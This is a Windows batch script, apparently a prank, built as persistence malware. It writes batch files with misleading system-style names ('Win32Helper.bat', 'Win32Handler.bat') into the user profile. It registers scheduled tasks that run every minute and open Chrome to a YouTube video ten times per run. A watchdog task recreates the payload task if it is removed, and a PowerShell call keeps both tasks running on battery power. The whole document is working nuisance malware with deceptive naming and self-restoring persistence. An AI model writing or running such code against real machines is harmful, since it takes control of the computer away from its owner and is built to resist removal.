@echo off
setlocal enabledelayedexpansion

set "taskfolder=%USERPROFILE%\System"
set "taskname=Win32Helper.bat"
set "taskfile=%taskfolder%\%taskname%"
set "driverfile=%taskfolder%\Win32Handler.bat"

set "copyfolder=%USERPROFILE%\Applications"

set "schname=sike"
set "schhost=HostDriverSH"

set "tasksettings=$TaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries;"


goto :MAIN


:CreateTaskFile
    mkdir "%taskfolder%"

    type nul > "%taskfile%"
    echo @echo off >> "%taskfile%"
    echo cd ^/ >> "%taskfile%"
    echo set /a i=0 >> "%taskfile%"
    echo :redir >> "%taskfile%"
    echo    start chrome.exe "https://www.youtube.com/watch?v=xvFZjo5PgG0" >> "%taskfile%"
    echo    set /a i=%%i%%+1 >> "%taskfile%"
    echo    if %%i%% lss 10 ( >> "%taskfile%"
    echo        call :redir >> "%taskfile%"
    echo    ) >> "%taskfile%"
    exit /b


:CreateTaskDriver
    type nul > "%driverfile%"
    echo @echo off >> "%driverfile%"
    echo cd ^/ >> "%driverfile%"
    echo schtasks /query /tn "%schname%" ^> nul >> "%driverfile%"
    echo if %%errorlevel%% neq 0 ( >> "%driverfile%"
    echo     mkdir "%copyfolder%" ^> nul >> "%driverfile%"
    echo     copy /Y "%taskfile%" "%copyfolder%\" ^> nul >> "%driverfile%"
    echo     schtasks /create /tn "%schname%" /tr "%copyfolder%\%taskname%" /sc minute /mo 1 /st 00:00:00 /f ^> nul >> "%driverfile%"
    echo     powershell -command %tasksettings%"Set-ScheduledTask -TaskName %schname% -Settings $TaskSettings" ^> nul >> "%driverfile%"
    echo     schtasks /run /tn "%schname%" ^> nul >> "%driverfile%"
    echo ) >> "%driverfile%"
    exit /b


:MAIN
    call :CreateTaskFile
    echo task file created

    call :CreateTaskDriver
    echo task driver created

    schtasks /create /tn "%schhost%" /tr "%driverfile%" /sc minute /mo 1 /st 00:00:00 /f
    powershell -command %tasksettings%"Set-ScheduledTask -TaskName %schhost% -Settings $TaskSettings"

    exit

endlocal